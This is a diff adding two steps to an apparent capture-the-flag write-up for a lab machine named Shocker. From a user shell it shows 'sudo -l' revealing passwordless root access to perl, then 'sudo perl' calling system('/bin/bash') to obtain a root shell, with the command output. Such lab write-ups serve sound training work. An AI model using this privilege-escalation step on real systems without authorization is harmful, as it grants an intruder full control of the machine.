@@ -162,3 +162,25 @@ Meterpreter  : x86/linux
 ```
 
 ### 4. Enumerate from foothold
+First thing to try is checking sudo.  
+```bash
+shelly@Shocker:~$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+I can run perl as root, with no password required.
+
+### 5. Escalate to root
+I can escalate by making use of the system() function and calling /bin/bash.
+```bash
+shelly@Shocker:~$ sudo perl -e "system('/bin/bash')"
+sudo perl -e "system('/bin/bash')"
+root@Shocker:~# whoami
+whoami
+root
+```
